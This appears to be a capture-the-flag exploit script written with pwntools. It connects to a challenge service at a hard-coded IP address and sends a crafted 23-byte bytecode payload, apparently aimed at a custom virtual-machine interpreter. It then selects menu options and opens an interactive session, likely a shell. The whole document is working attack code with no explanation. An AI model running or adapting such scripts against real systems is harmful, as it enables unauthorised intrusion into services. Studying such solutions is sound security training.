from pwn import *

context.binary = "./chall.bin"
context.log_level = "debug"

p = remote("134.112.58.12",15003)

payload = bytes([
    0x30, 0x01, 0x00, 0x90,
    0x20, 0x02, 0x20, 0x00, 0x00, 0x00,
    0x10, 0x03, 0x01, 0x02,
    0x40, 0x01, 0x00, 0x80,
    0x40, 0x03, 0x00, 0x88,
    0x60
])

assert len(payload) == 23

p.sendlineafter(b"> ", b"1")
p.sendlineafter(b"length: ", b"23")

hex_bytes = b" ".join(f"{b:02x}".encode() for b in payload)

log.info(f"payload: {hex_bytes.decode()}")

p.sendlineafter(b"verse (hex bytes): ", hex_bytes)

p.sendlineafter(b"> ", b"3")

p.interactive()